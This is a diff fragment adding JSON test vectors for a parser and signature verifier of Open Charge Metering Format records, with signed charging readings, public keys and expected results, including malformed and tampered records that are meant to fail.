+   "record": "OCMF|{\"FV\":\"1.4\",\"GI\":\"ocmf-rs vector generator\",\"GS\":\"VEC-05\",\"GV\":\"0.1.0\",\"PG\":\"T5\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1VEC0000000005\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\",\"OCPP_AUTH_TLS\",\"ISO15118_NONE\",\"PLMN_NONE\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"TT\":\"Vector tariff\",\"LC\":{\"LN\":\"cable\",\"LI\":1,\"LR\":2,\"LU\":\"mOhm\"},\"CT\":\"EVSEID\",\"CI\":\"DE*ABC*E005\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"CL\":0.5,\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"CL\":0.5,\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-brainpool256r1-SHA256\",\"SD\":\"3045022100888D1ABE4BB89C305C65BDE1D74D1A0B093BA717214BFBB183AE7AEDFA2EBE69022027A912C1FF973DE03B60D765A4C9A3C72783320266AD9F7C9C76D594899C217C\"}",
+   "key": "305A301406072A8648CE3D020106092B24030302080101070342000448130A2DB30EEC0F5FB3826A484CB14E03D7F1BA43AB318AFD9D4A119B63716F07A108A3AB51C47B8FF4C6439C125083D13711347E2BBFF4C99906FD3B5C3281",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["FormatVersionAheadOfReference"], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "curve/secp384r1",
+   "group": "curve",
+   "description": "a record signed ECDSA-secp384r1-SHA256 [OCMF Tab. 22]",
+   "record": "OCMF|{\"FV\":\"1.4\",\"GI\":\"ocmf-rs vector generator\",\"GS\":\"VEC-06\",\"GV\":\"0.1.0\",\"PG\":\"T6\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1VEC0000000006\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\",\"OCPP_AUTH_TLS\",\"ISO15118_NONE\",\"PLMN_NONE\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"TT\":\"Vector tariff\",\"LC\":{\"LN\":\"cable\",\"LI\":1,\"LR\":2,\"LU\":\"mOhm\"},\"CT\":\"EVSEID\",\"CI\":\"DE*ABC*E006\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"CL\":0.5,\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"CL\":0.5,\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp384r1-SHA256\",\"SD\":\"3066023100E2AB8FA88E6B4211E96BABDC514E22BBCFAD7A3BE9FA6EC4B15EEE3DB2F3369E5EEBEDE8273C26912354B8B159C58C9A0231008169A0EA34E00BE76ABFDDCE4745620880794E3124C966C46EE6F064C9F4286218333C223CEFADCFED384824B8B41CAE\"}",
+   "key": "3076301006072A8648CE3D020106052B810400220362000417D7B627EF61B89ADF4B45C63992BEBCAC0F966D2E2644E8A1F3C3C682BB946DE302A14C2160DC68B23C8FDEE82F53458725CB0AA1F8E429CEE6EF06E0C0225CF939C980AEB9C7B0E1C164AEC8D1AF34C902DC31D3B7D8E1DF7C2A3BFB9886ED",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["FormatVersionAheadOfReference", "HighSSignature"], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "curve/brainpoolP384r1",
+   "group": "curve",
+   "description": "a record signed ECDSA-brainpool384r1-SHA256 [OCMF Tab. 22]",
+   "record": "OCMF|{\"FV\":\"1.4\",\"GI\":\"ocmf-rs vector generator\",\"GS\":\"VEC-07\",\"GV\":\"0.1.0\",\"PG\":\"T7\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1VEC0000000007\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\",\"OCPP_AUTH_TLS\",\"ISO15118_NONE\",\"PLMN_NONE\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"TT\":\"Vector tariff\",\"LC\":{\"LN\":\"cable\",\"LI\":1,\"LR\":2,\"LU\":\"mOhm\"},\"CT\":\"EVSEID\",\"CI\":\"DE*ABC*E007\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"CL\":0.5,\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"CL\":0.5,\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-brainpool384r1-SHA256\",\"SD\":\"306502310080A3396890311BFF1E08A365E1CDB186BE848CB87173922A7734AC368FFA6820B768B6366E95C7C849F04E14E480134102306FF424B60978F17B32953B9C7C1E1854F09A8C493B7EC283F628E3A3498D69C096BEBCB250D9B1B644D092A1F5089EDA\"}",
+   "key": "307A301406072A8648CE3D020106092B240303020801010B0362000415B7EBF81A7A876559C1EE1464AE4E9EF929F14822FB4353A86D1492033AEDF3D7ACBF9D3E6DDF719D7C7E1623B0941621DEC2F872B8C02EFF24A85D0CC8CF16A01285194323E6BC6597668D5B2B47E1E8B792131031748A49676BE75547DA0B",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["FormatVersionAheadOfReference", "HighSSignature"], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "reject/not-ocmf",
+   "group": "reject",
+   "description": "no OCMF header",
+   "record": "NOPE|{}|{}",
+   "expect": { "parses": false, "round_trips": false, "verifies": null, "deviations": [], "readings": null, "billable_readings": null }
+  },
+  {
+   "id": "reject/missing-delimiter",
+   "group": "reject",
+   "description": "a header with no delimiter after it",
+   "record": "OCMF",
+   "expect": { "parses": false, "round_trips": false, "verifies": null, "deviations": [], "readings": null, "billable_readings": null }
+  },
+  {
+   "id": "reject/missing-signature-section",
+   "group": "reject",
+   "description": "a payload with no signature section",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}",
+   "expect": { "parses": false, "round_trips": false, "verifies": null, "deviations": [], "readings": null, "billable_readings": null }
+  },
+  {
+   "id": "reject/payload-not-an-object",
+   "group": "reject",
+   "description": "a payload section that is a JSON array",
+   "record": "OCMF|[]|{\"SD\":\"00\"}",
+   "expect": { "parses": false, "round_trips": false, "verifies": null, "deviations": [], "readings": null, "billable_readings": null }
+  },
+  {
+   "id": "reject/trailing-section-bytes",
+   "group": "reject",
+   "description": "bytes between the end of the payload and the delimiter",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]} junk|{\"SD\":\"00\"}",
+   "expect": { "parses": false, "round_trips": false, "verifies": null, "deviations": [], "readings": null, "billable_readings": null }
+  },
+  {
+   "id": "reject/too-many-sections",
+   "group": "reject",
+   "description": "five pipe-separated sections",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30440220583028797B6A7B2C18938F9E46A2D3533961CDD26869695D1CEE34E71120A45802207BCA8581C58B7132A4445E2F11844DBD5C826522628F0641D8DCADFDE91A0534\"}|3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E|extra",
+   "expect": { "parses": false, "round_trips": false, "verifies": null, "deviations": [], "readings": null, "billable_readings": null }
+  },
+  {
+   "id": "reject/tampered-reading",
+   "group": "reject",
+   "description": "a valid record with one digit of RV changed — parses, must not verify",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":900.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30440220583028797B6A7B2C18938F9E46A2D3533961CDD26869695D1CEE34E71120A45802207BCA8581C58B7132A4445E2F11844DBD5C826522628F0641D8DCADFDE91A0534\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": false, "deviations": [], "readings": 1, "billable_readings": 1 }
+  }
+ ]
+}
